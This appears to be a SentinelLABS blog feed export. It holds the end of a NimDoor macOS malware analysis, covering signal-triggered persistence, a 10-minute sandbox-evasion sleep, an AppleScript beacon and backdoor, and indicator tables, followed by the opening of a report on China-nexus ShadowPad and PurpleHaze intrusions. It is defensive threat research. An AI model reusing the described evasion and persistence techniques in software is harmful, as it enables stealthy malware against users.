<figure id="attachment_125002" aria-describedby="caption-attachment-125002" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4.jpg" alt="The lookup table is hard-coded in the __const section" width="1999" height="950" class="size-full wp-image-125002" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4-300x143.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4-1024x487.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4-768x365.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4-1536x730.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-125002" class="wp-caption-text">The lookup table is hard-coded in the <em>__const</em> section</figcaption></figure>
<p>After each case completes, the code consults the lookup table to determine the next state depending on error conditions or specific flags set during execution of the previous case. For example, if certain error bits are set, the next state value might be negated, effectively creating alternate paths through the state sequence depending on runtime conditions.</p>
<p>From an analysis point of view, much of the interesting malicious behaviour occurs in Case 1, which overrides some of the earlier signal handlers for intercepting SIGINT and SIGTERM. SIGINT is sent to a process when a user attempts to kill a process (such as by pressing <b>ctl-c</b> in the Terminal). SIGTERM, in contrast, is a signal sent by the system or another process, such as when the <code>kill</code> command is invoked by a user in the Terminal or by a program or script.</p>
<figure id="attachment_124988" aria-describedby="caption-attachment-124988" style="width: 1434px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18.jpg" alt="Signal handlers 0x2 (SIGINT) and 0xf (SIGTERM) are set up to catch termination" width="1434" height="350" class="size-full wp-image-124988" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18.jpg 1434w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18-300x73.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18-1024x250.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18-768x187.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18-818x199.jpg 818w" sizes="auto, (max-width: 1434px) 100vw, 1434px" /><figcaption id="caption-attachment-124988" class="wp-caption-text">Signal handlers 0x2 (SIGINT) and 0xf (SIGTERM) are set up to catch termination</figcaption></figure>
<p>When triggered, <code>CoreKitAgent</code> catches these signals and writes the LaunchAgent for persistence, a copy of <code>GoogIe LLC</code> as the loader, and a copy of itself as the trojan, setting executable permissions on the latter two via the <code>addExecutionPermissions_user95startup95mainZutils_u32</code> function.</p>
<figure id="attachment_124999" aria-describedby="caption-attachment-124999" style="width: 1548px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7.jpg" alt="Persistence logic writes and sets execution permissions on the agent, trojan and loader binaries" width="1548" height="1540" class="size-full wp-image-124999" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7.jpg 1548w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-300x298.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-1024x1019.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-150x150.jpg 150w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-768x764.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-1536x1528.jpg 1536w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-50x50.jpg 50w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-24x24.jpg 24w" sizes="auto, (max-width: 1548px) 100vw, 1548px" /><figcaption id="caption-attachment-124999" class="wp-caption-text">Persistence logic writes and sets execution permissions on the agent, trojan and loader binaries</figcaption></figure>
<p>This behavior ensures that any user-initiated termination of the malware results in the deployment of the core components, making the code resilient to basic defensive actions.</p>
<p>The state machine also contains a 10-minute sleep routine, likely as an anti-VM or sandbox countermeasure. The sleep routine is set up and called in Case 6 with a hard-coded value of <b>0x927c0</b> (600,000ms), as indicated in the following pseudocode.</p>
<pre>
void* rax_29 = _sleepAsync__user95startup95main_u73(0x927c0);  // 600,000ms = 10min
if (*r12 != 0)
	_eqdestroy___pureZasyncdispatch_u1229(rax_29);  // Error cleanup
else {
	_eqsink___pureZasyncdispatch_u7188(rsi_1 + 0x40, rax_29);  // Store future
	if (*r12 == 0) {
		*(r15 + 8) = 7;  // Transition to state 7
		rsi_15 = *(r15 + 0x40);
	}
}
</pre>
<p>The sleep function, <code>_sleepAsync__user95startup95main_u73</code>, uses the operating system&#8217;s <a href="https://developer.apple.com/documentation/driverkit/3438076-mach_absolute_time" target="_blank" rel="noopener noreferrer">mach_absolute_time()</a> and <a href="https://developer.apple.com/documentation/driverkit/3433733-mach_timebase_info" target="_blank" rel="noopener noreferrer">mach_timebase_info()</a> to create an asynchronous sleep. Rather than just blocking execution for 10 minutes &#8211; a technique many sandboxes would detect and counter &#8211; it instead registers a wake-up time with a global dispatcher and continues execution of the main event loop. When the sleep timer expires, <code>CoreKitAgent</code> calls Case 7 and continues execution.</p>
<h2>AppleScript Beacon and Backdoor</h2>
<p>The malware&#8217;s custom encryption and obfuscation routines involve multiple passes through several functions. One of these involves deobfuscating string literals made up of long sequences of hexadecimal numbers that are passed to a decrypt function, <code>_fromHex__pkgZnimcryptoZutils_u257</code>.</p>
<p>In the unstripped version, one of the hexadecimal strings contains the template for the previously discussed LaunchAgent. In both versions, although the content differs, an AppleScript is decoded, written to disk at  <code>~/.ses</code>, and launched via <code>osascript</code>.</p>
<figure id="attachment_124996" aria-describedby="caption-attachment-124996" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_10.jpg" alt="A string literal made up of hex characters is used to hide embedded AppleScript" width="1999" height="662" class="size-full wp-image-124996" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_10.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_10-300x99.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_10-1024x339.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_10-768x254.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_10-1536x509.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-124996" class="wp-caption-text">A string literal made up of hex characters is used to hide embedded AppleScript</figcaption></figure>
<figure id="attachment_124989" aria-describedby="caption-attachment-124989" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_17.jpg" alt="The embedded .ses script in the unstripped CoreKitAgent binary after decoding" width="1999" height="1652" class="size-full wp-image-124989" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_17.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_17-300x248.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_17-1024x846.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_17-768x635.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_17-1536x1269.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-124989" class="wp-caption-text">The embedded <em>.ses</em> script in the unstripped <em>CoreKitAgent</em> binary after decoding</figcaption></figure>
<p>The embedded AppleScript fetches the current Unix timestamp via <code>date</code> to create a unique ID and builds an HTTP header string. Throughout, the authors have broken strings down into character lists to help protect the script from simple scanning rules. The same trick is used to disguise two hardcoded C2 addresses, <code>writeup[.]live</code> and <code>safeup[.]store</code>.</p>
<p>On execution, the script beacons out every 30 seconds to one of the two hardcoded C2s, chosen at random, and attempts to post data obtained from listing all running processes on the victim machine. The script also executes any response received from the C2 via the <code>run script</code> command, meaning this simple AppleScript functions both as a beacon and a backdoor.</p>
<p>The embedded AppleScript in the stripped version of <code>CoreKitAgent</code> takes a different form and uses different embedded C2 server addresses but has similar functionality, including the 30 second delay interval.</p>
<figure id="attachment_125001" aria-describedby="caption-attachment-125001" style="width: 1906px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5.jpg" alt="The embedded .ses script in the stripped CoreKitAgent binary after decoding" width="1906" height="1674" class="size-full wp-image-125001" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5.jpg 1906w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5-300x263.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5-1024x899.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5-768x675.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5-1536x1349.jpg 1536w" sizes="auto, (max-width: 1906px) 100vw, 1906px" /><figcaption id="caption-attachment-125001" class="wp-caption-text">The embedded <em>.ses</em> script in the stripped <em>CoreKitAgent</em> binary after decoding</figcaption></figure>
<h2>Conclusion</h2>
<p>SentinelLABS&#8217; analysis of NimDoor shows how threat actors are continuing to explore cross-platform languages that introduce new levels of complexity for analysts.</p>
<p>North Korean-aligned threat actors have <a href="https://www.sentinelone.com/blog/dprk-crypto-theft-macos-rustbucket-droppers-pivot-to-deliver-kandykorn-payloads/" target="_blank" rel="noopener noreferrer">previously experimented</a> with Go and Rust, similarly combining scripts and compiled binaries into multi-stage attack chains. However, Nim&#8217;s rather unique ability to <a href="https://nim-lang.org/docs/manual.html?utm_source=chatgpt.com#pragmas-compiletime-pragma" target="_blank" rel="noopener noreferrer">execute</a> functions during compile time allows attackers to blend complex behaviour into a binary with less obvious control flow, resulting in compiled binaries in which developer code and Nim runtime code are intermingled even at the function level.</p>
<p>At the same time, the attackers take full advantage of macOS&#8217;s built-in scripting capabilities. Leveraging AppleScript to perform duties like beaconing is a novel approach that removes the need for a traditional post-exploitation framework and the detection &#8216;noise&#8217; such implants can create. In addition, the use of <code>wss</code> for communications and signal interrupts to trigger persistence logic provide yet further evidence of active development in new ways to defeat security measures.</p>
<p>Earlier this year, we saw threat actors utilizing <a href="https://www.sentinelone.com/blog/readerupdate-reforged-melting-pot-of-macos-malware-adds-go-to-crystal-nim-and-rust-variants/" target="_blank" rel="noopener noreferrer">Nim as well as Crystal</a>, and we expect the choice of less familiar languages to become an increasing trend among macOS malware authors due both to their technical advantages and their unfamiliarity to analysts. As ever in the cat-and-mouse game of threat and threat detection, when one side innovates, the other must respond, and we encourage other analysts, researchers, and detection engineers to invest effort in understanding these lesser-known languages and how they will eventually be leveraged.</p>
<h2>Indicators of Compromise</h2>
<p><b>Domains</b></p>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">dataupload[.]store</td>
<td style="width: 50.0%; height: 24px;">upl/tlgrm C2</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">firstfromsep[.]online</td>
<td style="width: 50.0%; height: 24px;">netchk C2</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">safeup[.]store</td>
<td style="width: 50.0%; height: 24px;">CoreKit C2</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">support[.]us05web-zoom[.]pro</td>
<td style="width: 50.0%; height: 24px;">zoom_sdk_support.scpt C2</td>
</tr>
<tr style="height: 24px;">
<td style="width: 50.0%; height: 24px;">writeup[.]live</td>
<td style="width: 50.0%; height: 24px;">CoreKit C2</td>
</tr>
</tbody>
</table>
</div>
<p><b>FilePaths</b><br />
~/Library/Application Support/Google LLC/GoogIe LLC<br />
~/Library/LaunchAgents/com.google.update.plist<br />
~/.ses<br />
~/Library/DnsService/a<br />
~/Library/DnsService/netchk<br />
/private/tmp/.config<br />
/private/tmp/cfg</p>
<p><b>Binaries | SHA-1</b></p>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">027d4020f2dd1eb473636bc112a84f0a90b6651c </td>
<td style="width: 33.0%; height: 24px;">trojan1_arm64 (x86_64)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">0602a5b8f089f957eeda51f81ac0f9ad4e336b87 </td>
<td style="width: 33.0%; height: 24px;">GoogIe LLC (universal)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">06566eabf54caafe36ebe94430d392b9cf3426ba </td>
<td style="width: 33.0%; height: 24px;">installer (universal)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">08af4c21cd0a165695c756b6fda37016197b01e7 </td>
<td style="width: 33.0%; height: 24px;">installer (universal)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">16a6b0023ba3fde15bd0bba1b17a18bfa00a8f59 </td>
<td style="width: 33.0%; height: 24px;">GoogIe LLC (arm64)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">1a5392102d57e9ea4dd33d3b7181d66b4d08d01d </td>
<td style="width: 33.0%; height: 24px;">CoreKitAgent (x86_64)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">2c0177b302c4643c49dd7016530a4749298d964c </td>
<td style="width: 33.0%; height: 24px;">CoreKitAgent (arm64)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">2d746dda85805c79b5f6ea376f97d9b2f547da5d </td>
<td style="width: 33.0%; height: 24px;">netchk (arm64)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">2ed2edec8ccc44292410042c730c190027b87930 </td>
<td style="width: 33.0%; height: 24px;">trojan1_arm64 (arm64)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">3168e996cb20bd7b4208d0864e962a4b70c5a0e7 </td>
<td style="width: 33.0%; height: 24px;">GoogIe LLC (x86_64)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">5b16e9d6e92be2124ba496bf82d38fb35681c7ad </td>
<td style="width: 33.0%; height: 24px;">a (universal)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">7c04225a62b953e1268653f637b569a3b2eb06f8 </td>
<td style="width: 33.0%; height: 24px;">installer (arm64)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">945fcd3e08854a081c04c06eeb95ad6e0d9cdc19 </td>
<td style="width: 33.0%; height: 24px;">CoreKitAgent (universal)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">a25c06e8545666d6d2a88c8da300cf3383149d5a </td>
<td style="width: 33.0%; height: 24px;">CoreKitAgent (universal)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">c9540dee9bdb28894332c5a74f696b4f94e4680c </td>
<td style="width: 33.0%; height: 24px;">GoogIe_LLC (universal)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">e227e2e4a6ffb7280dfe7618be20514823d3e4f5 </td>
<td style="width: 33.0%; height: 24px;">installer (x86_64)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">ee3795f6418fc0cacbe884a8eb803498c2b5776f </td>
<td style="width: 33.0%; height: 24px;">netchk (x86_64)</td>
</tr>
</tbody>
</table>
</div>
<p><b>Scripts</b><br />
<i>Observed</i></p>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">023a15ac687e2d2e187d03e9976a89ef5f6c1617 </td>
<td style="width: 33.0%; height: 24px;">zoom_sdk_support.scpt</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">bb72ca0e19a95c48a9ee4fd658958a0ae2af44b6 </td>
<td style="width: 33.0%; height: 24px;">tlgm</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">4743d5202dbe565721d75f7fb1eca43266a652d4 </td>
<td style="width: 33.0%; height: 24px;">upl</td>
</tr>
</tbody>
</table>
</div>
<p><i>Related</i></p>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">1e76f497051829fa804e72b9d14f44da5a531df8 </td>
<td style="width: 33.0%; height: 24px;">expl (upl variant)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 67.0%; height: 24px;">79f37e0b728de2c5a4bfe8fcf292941d54e121b8 </td>
<td style="width: 33.0%; height: 24px;">upl (upl variant)</td>
</tr>
</tbody>
</table>
</div>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/07/25_MKTG_Comms_Blog_022_Generic_LABS_Blog_Images_07.jpg" length="215705" type="image/jpeg" />	</item>
		<item>
		<title>Follow the Smoke &#124; China-nexus Threat Actors Hammer At the Doors of Top Tier Targets</title>
		<link>https://www.sentinelone.com/labs/follow-the-smoke-china-nexus-threat-actors-hammer-at-the-doors-of-top-tier-targets/</link>
		
		<dc:creator><![CDATA[Aleksandar Milenkoski &amp; Tom Hegel]]></dc:creator>
		<pubDate>Mon, 09 Jun 2025 09:55:54 +0000</pubDate>
				<category><![CDATA[adversary]]></category>
		<category><![CDATA[China]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=122981</guid>

					<description><![CDATA[This report uncovers a set of related threat clusters linked to PurpleHaze and ShadowPad operators targeting organizations, including cybersecurity vendors.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">In October 2024, SentinelLABS observed and countered a reconnaissance operation targeting SentinelOne, which we track as part of a broader activity cluster named PurpleHaze.</li>
<li aria-level="1">At the beginning of 2025, we also identified and helped disrupt an intrusion linked to a wider ShadowPad operation. The affected organization was responsible for managing hardware logistics for SentinelOne employees at the time.</li>
<li aria-level="1">A thorough investigation of SentinelOne&#8217;s infrastructure, software, and hardware assets confirmed that the attackers were unsuccessful and SentinelOne was not compromised by any of these activities.</li>
<li aria-level="1">The PurpleHaze and ShadowPad activity clusters span multiple partially related intrusions into different targets occurring between July 2024 and March 2025. The victimology includes a South Asian government entity, a European media organization, and more than 70 organizations across a wide range of sectors.</li>
<li aria-level="1">We attribute the PurpleHaze and ShadowPad activity clusters with high confidence to China-nexus threat actors. We loosely associate some PurpleHaze intrusions with actors that overlap with the suspected Chinese cyberespionage groups publicly reported as APT15 and UNC5174.</li>
<li aria-level="1">This research underscores the persistent threat Chinese cyberespionage actors pose to global industries and public sector organizations, while also highlighting a rarely discussed target they pursue: cybersecurity vendors.</li>
</ul>
<h2>Overview</h2>
<p>This research outlines threats that SentinelLABS observed and defended against in late 2024 and the first quarter of 2025. This post expands upon <a href="https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/" target="_blank" rel="noopener noreferrer">previous SentinelLABS research</a>, which provides an overview of threats against cybersecurity vendors, including SentinelOne, ranging from financially motivated crimeware to targeted attacks by nation-state actors. This research focuses specifically on the subset of threats targeting SentinelOne and others that we attribute to China-nexus threat actors.</p>
<p>By disclosing details of the threat activities we have faced, we bring into focus an aspect of the threat landscape that has received limited attention in public cyber threat intelligence discourse: the targeting of cybersecurity vendors. Our objective is to contribute to strengthening industry defenses by promoting transparency and encouraging collaboration. Cybersecurity companies are high-value targets for threat actors due to their protective roles, deep visibility into client environments, and ability to disrupt adversary operations. The findings detailed in this post highlight the persistent interest of China-nexus actors in these organizations.</p>
<p>This research focuses on the following activities targeting SentinelOne, as well as suspected related operations identified during our investigations:</p>
<ul>
<li aria-level="1">An intrusion into an IT services and logistics organization, which was responsible at the time for managing hardware logistics for SentinelOne employees.</li>
<li aria-level="1">Extensive remote reconnaissance of SentinelOne servers intentionally reachable from the Internet by virtue of their functionality.</li>
</ul>
<p>We promptly informed the IT services and logistics organization of the intrusion details. A thorough investigation into SentinelOne&#8217;s infrastructure, software, and hardware assets found no evidence of compromise.</p>
<p>At this point, it remains unclear whether the perpetrators&#8217; focus was solely on the targeted IT logistics organization or if they intended to extend their reach to downstream organizations as well. Nevertheless, this case underscores the persistent threat posed by suspected Chinese threat actors, who have a history of seeking to establish <a href="https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/" target="_blank" rel="noopener noreferrer">strategic footholds</a> to potentially compromise downstream entities.</p>
<p>As for the reconnaissance activity, we promptly identified and mapped the threat actor&#8217;s infrastructure involved in this operation as soon as it began. A thorough investigation of SentinelOne servers probed by the attackers revealed no signs of compromise. We assess with high confidence that the threat actor&#8217;s activities were limited to mapping and evaluating the availability of select Internet-facing servers, likely in preparation for potential future actions. Continuous monitoring of network traffic to our servers, which is part of established and continuing practice for protecting SentinelOne assets exposed to the Internet, enabled rapid detection and increased scrutiny to the reconnaissance activities, effectively mitigating any potential risks.</p>
<p>Further investigations uncovered multiple, partially related intrusions and clusters of activity characteristic of modern Chinese-nexus operations:</p>
<ul>
<li aria-level="1">Activity A: June 2024 intrusion into a South Asian government entity</li>
<li aria-level="1">Activity B: A set of intrusions impacting organizations worldwide occurring between July 2024 and March 2025</li>
<li aria-level="1">Activity C: Intrusion into an IT services and logistics company at the beginning of 2025</li>
<li aria-level="1">Activity D: October 2024 intrusion into the same government entity compromised in June 2024</li>
<li aria-level="1">Activity E: October 2024 reconnaissance activity targeting SentinelOne</li>
<li aria-level="1">Activity F: September 2024 intrusion into a leading European media organization</li>
</ul>
<p>The next two sections provide an overview of these activities, including timelines, points of overlap, and our attribution assessments, followed by concrete technical details, such as observed TTPs, malware, and infrastructure to enable other organizations in related sectors to investigate and mitigate similar sets of activity.</p>
<h2>Overview | ShadowPad Intrusions</h2>
<figure id="attachment_123751" aria-describedby="caption-attachment-123751" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10.jpg" alt="ShadowPad activity, June 2024 - March 2025" width="1999" height="1278" class="size-full wp-image-123751" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-300x192.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-1024x655.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-768x491.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-1536x982.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123751" class="wp-caption-text">ShadowPad activity, June 2024 &#8211; March 2025</figcaption></figure>
<p>In June 2024, SentinelLABS observed threat actor activity involving the ShadowPad malware targeting a South Asian government entity that provides IT solutions and infrastructure across multiple sectors (Activity A). The ShadowPad sample we retrieved was obfuscated using a variant of <a href="https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator" target="_blank" rel="noopener noreferrer">ScatterBrain</a>, an evolution of the <a href="https://www.pwc.co.uk/issues/cyber-security-services/insights/chasing-shadows.html" target="_blank" rel="noopener noreferrer">ScatterBee</a> obfuscation mechanism.</p>
<p>Based on ShadowPad implementation characteristics, we identified additional samples that revealed broader activity taking place between July 2024 and March 2025, spanning a wide range of victims globally (Activity B). Using C2 netflow and SentinelOne telemetry data, SentinelLABS uncovered over 70 victims across sectors such as manufacturing, government, finance, telecommunications, and research. Potentially affected SentinelOne customers were proactively contacted by our Threat Discovery and Response (TDR) teams. One of the impacted entities was an IT services and logistics company, which had been responsible for managing hardware logistics for SentinelOne employees during that period (Activity C).</p>
<p>We attribute these intrusions with high confidence to China-nexus actors, with ongoing efforts aimed at determining the specific threat clusters involved. <a href="https://www.sentinelone.com/labs/shadowpad-a-masterpiece-of-privately-sold-malware-in-chinese-espionage/" target="_blank" rel="noopener noreferrer">ShadowPad</a> is a closed-source modular backdoor platform used by multiple suspected China-nexus threat actors to conduct cyberespionage. Google Threat Intelligence Group <a href="https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator" target="_blank" rel="noopener noreferrer">has observed</a> the use of ScatterBrain-obfuscated ShadowPad samples since 2022 and attributes them to clusters associated with the suspected Chinese APT umbrella actor APT41.</p>
<p>Several of the ShadowPad samples and infrastructure we identified have also been documented in previous public reporting on recent ShadowPad activities, including research published by <a href="https://www.trendmicro.com/en_us/research/25/b/updated-shadowpad-malware-leads-to-ransomware-deployment.html" target="_blank" rel="noopener noreferrer">TrendMicro</a>, <a href="https://www.orangecyberdefense.com/global/blog/cert-news/meet-nailaolocker-a-ransomware-distributed-in-europe-by-shadowpad-and-plugx-backdoors" target="_blank" rel="noopener noreferrer">Orange Cyberdefense</a>, and <a href="https://blog.checkpoint.com/security/check-point-research-explains-shadow-pad-nailaolocker-and-its-protection/" target="_blank" rel="noopener noreferrer">Check Point</a>. Some of these activities have included the deployment of ransomware referred to as NailaoLocker, though the motive remains unclear, whether for financial gain or as a <a href="https://www.sentinelone.com/labs/chamelgang-attacking-critical-infrastructure-with-ransomware/" target="_blank" rel="noopener noreferrer">means</a> of distraction, misattribution, or removal of evidence.</p>
<h2>Overview | The PurpleHaze Activity Cluster</h2>
<figure id="attachment_123743" aria-describedby="caption-attachment-123743" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5.jpg" alt="PurpleHaze activity, September - October 2024" width="1999" height="1278" class="size-full wp-image-123743" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5-300x192.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5-1024x655.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5-768x491.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5-1536x982.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123743" class="wp-caption-text">PurpleHaze activity, September &#8211; October 2024</figcaption></figure>
<p>In early October 2024, SentinelLABS observed new threat actor activity (Activity D) at the same South Asian government entity compromised using ShadowPad in June 2024 (Activity A).</p>
<p>This intrusion involved backdoors that we classify as part of a malware cluster designated GOREshell, our designation for a loose malware cluster that includes the open-source <a href="https://github.com/NHAS/reverse_ssh" target="_blank" rel="noopener noreferrer">reverse_ssh</a> backdoor and its custom variants, which we have observed in targeted attacks. While these variants exhibit variations in implementation, all share code similarities with the client component of <code>reverse_ssh</code>.</p>
<p>We track some of the infrastructure used in this intrusion as part of an operational relay box (ORB) network used by several suspected Chinese cyberespionage actors, particularly a threat group that overlaps with public reporting on APT15. The use of ORB networks is a <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/" target="_blank" rel="noopener noreferrer">growing</a> trend among Chinese threat groups, since they can be rapidly expanded to create a dynamic and evolving infrastructure that makes tracking cyberespionage operations and their attribution challenging. APT15, also historically referred to as Ke3Chang and Nylon Typhoon, is a suspected Chinese cyberespionage actor known for its global targeting of critical sectors, including telecommunications, information technology, and government organizations.</p>
<p>Further, in October 2024, the same month as the activity targeting the South Asian government entity, SentinelLABS observed remote connections to Internet-facing SentinelOne servers for reconnaissance (Activity E). Based on significant overlaps in infrastructure management, as well as domain creation and naming practices, we associate with high confidence the infrastructure observed in the reconnaissance operation with that used by the threat actor targeting the South Asian government entity (Activity D). This suggests the involvement of the same threat actor, or of a third-party entity responsible for managing infrastructure for multiple threat groups, a common practice in the Chinese cyberespionage landscape.</p>
<p>In late September 2024, a few weeks before the October activities, SentinelLABS observed an intrusion into a leading European media organization (Activity F). Our investigation revealed overlaps in the tools used during this intrusion and the October 2024 activity targeting the South Asian government entity (Activity D). This includes the GOREshell backdoor and publicly available tools developed by <a href="https://www.thc.org/" target="_blank" rel="noopener noreferrer">The Hacker&#8217;s Choice</a> (THC), a community of cybersecurity researchers.</p>
<p>Activity D and Activity F are the first instances in which we have observed THC tooling used in the context of APT activities.</p>
<p>We attribute Activity F with high confidence to a China-nexus actor, loosely associating it with a suspected Chinese initial access broker <a href="https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect" target="_blank" rel="noopener noreferrer">tracked</a> as UNC5174 by Mandiant. We acknowledge the possibility that post-intrusion activities may have been conducted by a different threat group.</p>
